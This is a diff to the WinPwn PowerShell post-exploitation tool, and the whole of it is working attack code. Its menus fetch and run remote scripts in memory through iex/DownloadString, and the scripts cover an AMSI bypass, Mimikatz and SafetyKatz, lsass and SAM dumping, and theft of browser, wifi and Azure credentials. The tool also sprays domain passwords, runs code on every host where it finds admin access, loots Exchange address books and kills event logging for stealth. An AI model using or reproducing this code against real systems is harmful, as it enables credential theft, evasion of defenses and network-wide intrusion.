@@ -10,11 +10,11 @@ function AmsiBypass
 {
     <#
         .DESCRIPTION
-        Amsi bypass by https://github.com/rasta-mouse/AmsiScanBufferBypass
+        Credit to Rastamouse
         License: BSD 3-Clause
     #>
-    #Privilege Escalation Phase
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
+    #
+    $string = iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsicustom.ps1')
 }
 
 function dependencychecks
@@ -403,67 +403,118 @@ function kittielocal
 {
     <#
     .DESCRIPTION
-        Dumps Credentials from Memory / SAM Database.
+        Dumps Credentials from Memory / Registry / SAM Database.
         Author: @securethisshit
         License: BSD 3-Clause
     #>
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     AmsiBypass
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
-    
-    if (isadmin)
-    {
-            $safety = Read-Host -Prompt 'Execute safetykatz instead of invoke-kittie in memory? (recommended) (yes/no)'
-            if ($safety -eq "yes" -or $safety -eq "y" -or $safety -eq "Yes" -or $safety -eq "Y")
-            {
-                Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-                $lsass = Read-Host -Prompt 'Only dump lsass without using the cat (more stealth)? (recommended) (yes/no)'
-		        if ($lsass -eq "yes" -or $lsass -eq "y" -or $lsass -eq "Yes" -or $lsass -eq "Y")
-                {
-                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
-                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
-                    Safetydump   
-                }
-                else{Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true}
-		   
-            }
-            else
-            {
-                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
-                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
-                
-                Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-                Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-                
-                $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
-                if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
-                {
-                    Write-Host -ForegroundColor Yellow 'Dumping Credentials from lsass.exe:'
-                    Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
-                    Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
-                }
-                else
-                {
-                Invoke-Mimikatz
-                Get-WLAN-Keys
-                }
-            }
-    }
-    else
-    {
-        Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
-        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-        Write-Host -ForegroundColor Yellow 'Running the small kittie:'
-        inbox >> $currentPath\Exploitation\kittenz.txt
+      
+        do
+        {
+	     @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Get some credentials
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
+            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie (Admin session only, heuristic detection likely)! '
+            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
+            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
+            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
+            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
+            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
+            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
+	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only'
+	    Write-Host -ForegroundColor Green '10. Exit. '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
 
-    }
-
+            Switch ($masterquestion) 
+            {
+                1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
+                2{if (isadmin){obfuskittiedump}}
+                3{if(isadmin){safedump}}
+                4{if(isadmin){dumplsass}}
+                5{lazagnemodule}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
+		7{kittenz}
+		8{if(isadmin){wificreds}}
+		9{if(isadmin){samfile}}
+             }
+        }
+        While ($masterquestion -ne 10)
 }
 
+function safedump
+{
+   	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+	Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+}
+    
+function obfuskittiedump
+{
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
+	Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
+        Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
+}
+function wificreds
+{
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
+	Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
+	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
+}
+    
+function kittenz
+{
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
+	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
+	inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
+}
+    
+function samfile
+{
+    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
+    	Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
+	Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+}
+
+function dumplsass
+{
+<#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+    	try{
+    	$processes = Get-Process
+    	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+	Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
+	Write-Host "Dumpfile goes to .\Exploitation\$env:computername.dmp "
+	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.dmp full
+	}
+	catch{
+		Write-Host "Something went wrong, using safetykatz instead"
+                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
+                 Write-Host -ForegroundColor Yellow 'Dumping lsass to .\Exploitation\debug.bin :'
+                 Safetydump
+		 move C:\windows\temp\debug.bin $currentPath\Exploitation\debug.bin
+	}
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
 
 function localreconmodules
 {
@@ -955,12 +1006,9 @@ function domainreconmodules
             #Search for AD-Passwords in description fields
             Write-Host -ForegroundColor Yellow 'Searching for passwords in active directory description fields..'
             
-            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            
-            Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
-            Import-Module .\Microsoft.ActiveDirectory.Management.dll
-            Start-Sleep -Seconds 2
-	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/ADModuleImport.ps1')            
+    
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
             Write-Host -ForegroundColor Yellow 'Searching for Users without password Change for a long time'
@@ -1044,7 +1092,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '6. Search for MS17-10 vulnerable Windows Servers in the domain! '
         Write-Host -ForegroundColor Green '7. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
         Write-Host -ForegroundColor Green '8. Check domain Group policies for common misconfigurations using Grouper2! '
-        Write-Host -ForegroundColor Green '9. Exit. '
+        Write-Host -ForegroundColor Green '9. LAPS Checks!'
+        Write-Host -ForegroundColor Green '10. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1058,9 +1107,10 @@ __        ___       ____
              6{MS17-10}
              7{passhunt -domain $true}
              8{GPOAudit}
+             9{lapschecks}
        }
     }
- While ($masterquestion -ne 9)
+ While ($masterquestion -ne 10)
 }
 
 function GPOAudit
@@ -1292,7 +1342,6 @@ function latmov
     #Lateral Movement Phase
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = Get-NetDomain
@@ -1304,44 +1353,41 @@ function latmov
 
     fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
 
-    $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
-    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "kittie" -or $exploitdecision -eq "Credentials")
+    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
+    elseif ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
     {
-        #Masskittie
-        $masskittie = Read-Host -Prompt 'Do you want to use Masskittie for all found Systems? (yes/no)'
-        if ($masskittie -eq "yes" -or $masskittie -eq "y" -or $masskittie -eq "Yes" -or $masskittie -eq "Y")
-        {
-           if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
-           {
-               bookmobile -sILeZZaOSNUwrt9 $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
-           }
-           else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
-        }
+        launcher
     }
-    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT")
-    {
-        empirelauncher
-    }
-    #Domainspray
-    $domainspray = Read-Host -Prompt 'Do you want to Spray the Network with prepared Credentials? (yes/no)'
-    if ($domainspray -eq "yes" -or $domainspray -eq "y" -or $domainspray -eq "Yes" -or $domainspray -eq "Y")
-    {
+}
 
+function domainpassspray
+{
+    <#
+        .DESCRIPTION
+        Domain password spray, credit to https://github.com/dafthack/.
+    #>
+    #Lateral Movement Phase
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
+    $domain_Name = Get-NetDomain
+    $Domain = $domain_Name.Name
+	
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
+    Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt
        if (Test-Path $currentPath\passlist.txt) 
         {
             Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
         }
         else 
         { 
-           Write-Host -ForegroundColor Red 'There is no passlist.txt File in the current folder'
-           $passlist = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
-           $passlist >> $currentPath\passlist.txt
-           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
-        }
-    }
+           $onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
+           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
+           Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"
+	}
 }
 
-function empirelauncher
+function launcher
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
@@ -1352,7 +1398,7 @@ function empirelauncher
     }
     else
     {
-        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
+        $file = "$currentPath\Exploitation\Exploited.txt"
         While($i -ne "quit") 
         {
 	        If ($i -ne $NULL) 
@@ -1364,21 +1410,21 @@ function empirelauncher
 
     }
 
-    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
+    $stagerfile = "$currentPath\Exploitation\Stager.txt"
     While($Payload -ne "quit") 
     {
 	    If ($Payload -ne $NULL) 
         {
 	        $Payload.Trim() | Out-File $stagerfile -append
 	    }
-        $Payload = Read-Host -Prompt 'Please provide the powershell Empire Stager payload (beginning with "powershell -noP -sta -w 1 -enc  BASE64Code") :'
+        $Payload = Read-Host -Prompt 'Please provide the code to execute :'
     }
     
     $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'
 
-    if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
+    if (Test-Path $currentPath\Exploitation\Exploited.txt)
     {
-        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
+        $Hosts = Get-Content "$currentPath\Exploitation\Exploited.txt"
     }
     else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}
 
@@ -1645,6 +1691,71 @@ function fruit
 {
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
 }
+
+function snipemails
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    #Todo Menu
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/snipemails.ps1')
+    try{
+        $currentdomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    }
+    catch
+    {Write-Host "No domain for this computer found! Cannot use Mailsniper here!";return} #Todo ask for Domain
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/snipemails.ps1')
+    if ($currentdomain)
+    {
+        $exch = Resolve-DnsName -type $currentdomain
+        if ($exch.Count -cne 1){$first = $exch.NameExchange | select-object -first 1}else{$first = $exch}
+        Write-Host "Looting adress book"
+        Get-GlobalAddressList -ExchHostname $first -OutFile "$currentPath\DomainRecon\Email-list.txt"
+        Write-Host "Looking for available Inboxes"
+        Invoke-OpenInboxFinder -EmailList "$currentPath\DomainRecon\Email-list.txt"
+        $OpenInboxes = Get-Content "$currentPath\DomainRecon\Email-list.txt"
+        Write-Host "Following Mailboxes are allowed to access for your user: "
+        $OpenInboxes
+    }
+    #Todo SelfSearch, OWA Brute, GlobalSearch
+}
+
+function lapschecks
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/LAPSToolkit.ps1')
+    Write-Host "Checking for LAPS enabled Computers."
+    Get-LAPSComputers >> "$currentPath\DomainRecon\LapsInformations.txt"
+    Write-Host "Checking for LAPS Administrator groups."
+    Find-LAPSDelegatedGroups >> "$currentPath\DomainRecon\LapsAllowedAdminGroups.txt"
+    Write-Host "Checking for special right users with access to laps passwords."
+    Find-AdmPwdExtendedRights >> "$currentPath\DomainRecon\LapsSpecialRights.txt"
+}
+
+
+function azurechecks
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    Write-Host "Specify a base URL for blob / subdomain search:"
+    $base = Read-Host
+    mkdir AzureEnum
+    mkdir misc
+    Invoke-Webrequest -Uri "https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/permutations.txt" -outfile .\Misc\permutations.txt
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-EnumerateAzureBlobs.ps1')
+    Invoke-EnumerateAzureBlobs -base $base -Permutations .\misc\permutations.txt >> .\AzureEnum\Blobs.txt
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-EnumerateAzureSubDomains.ps1')
+    Invoke-EnumerateAzureSubDomains -Base $base -Permutations .\misc\permutations.txt >> .\AzureEnum\Subdomains.txt
+
+    if (isadmin)
+    {
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-MSOLDomainInfo.ps1')
+        Get-MSOLDomainInfo
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-AzurePasswords.ps1')
+        Get-AzurePasswords
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-AzureDomainInfo.ps1')
+        Get-AzureDomainInfo
+    }
+}
     
 function WinPwn
 {
@@ -1673,28 +1784,30 @@ __        ___       ____
     {
         Write-Host "================ WinPwn ================"
         Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
-        Write-Host -ForegroundColor Green '2. Start local recon phase! '
-        Write-Host -ForegroundColor Green '3. Start domain recon phase! '
-        Write-Host -ForegroundColor Green '4. Try to escalate my local privileges! '
-        Write-Host -ForegroundColor Green '5. Kerberoast some service accounts! '
-        Write-Host -ForegroundColor Green '6. Search for SQL Servers in the domain and pwn them if possible! '
+        Write-Host -ForegroundColor Green '2. Local recon! '
+        Write-Host -ForegroundColor Green '3. Domain recon! '
+        Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
+        Write-Host -ForegroundColor Green '5. Kerberoasting! '
+        Write-Host -ForegroundColor Green '6. PowerUpSQL checks! '
         Write-Host -ForegroundColor Green '7. Collect Bloodhound information! '
-        Write-Host -ForegroundColor Green '8. Search for MS17-10 vulnerable Servers / Clients in this domain! '
-        Write-Host -ForegroundColor Green '9. Give me some Credentials, now! '
+        Write-Host -ForegroundColor Green '8. MS17-10 domain system scanner! '
+        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
         Write-Host -ForegroundColor Green '10. Search for Systems with Admin-Access to pwn them! '
-        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard for ultimate mitm in all networks! '
-        Write-Host -ForegroundColor Green '12. Execute Sessiongopher! '
-        Write-Host -ForegroundColor Green '13. I want to check some remote system groups via GPO Mapping! '
-        Write-Host -ForegroundColor Green '14. I am local admin, kill the event log services for stealth! '
+        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '12. Sessiongopher! '
+        Write-Host -ForegroundColor Green '13. Check remote system groups via GPO Mapping! '
+        Write-Host -ForegroundColor Green '14. Kill the event log services for stealth! '
         Write-Host -ForegroundColor Green '15. Search for passwords on this system! '
-        Write-Host -ForegroundColor Green '16. Just one ADRecon Report for me! '
+        Write-Host -ForegroundColor Green '16. ADRecon Report! '
         Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '18. Find some network shares! '
-	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
-	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
-	Write-Host -ForegroundColor Green '21. Show some polar bears in action!'
-    Write-Host -ForegroundColor Green '22. Do an Group Policy Audit using Grouper2!'
-        Write-Host -ForegroundColor Green '23. Exit. '
+	    Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
+	    Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
+    	Write-Host -ForegroundColor Green '21. Do an Group Policy Audit using Grouper2!'
+	    Write-Host -ForegroundColor Green '22. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '23. Mailsniper menu!'
+        Write-Host -ForegroundColor Green '24. Azure checks!'
+        Write-Host -ForegroundColor Green '25. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1720,11 +1833,13 @@ __        ___       ____
             18{sharenumeration}
 	    19{sharpcradle -allthosedotnet $true}
 	    20{sharpcradle}
-	    21{sharpcradle -polar $true}
-        22{GPOAudit}
+            21{GPOAudit}
+	    22{domainpassspray}
+    23{snipemails}
+    24{azurechecks}
        }
     }
- While ($masterquestion -ne 23)
+ While ($masterquestion -ne 25)
      
     
     #End
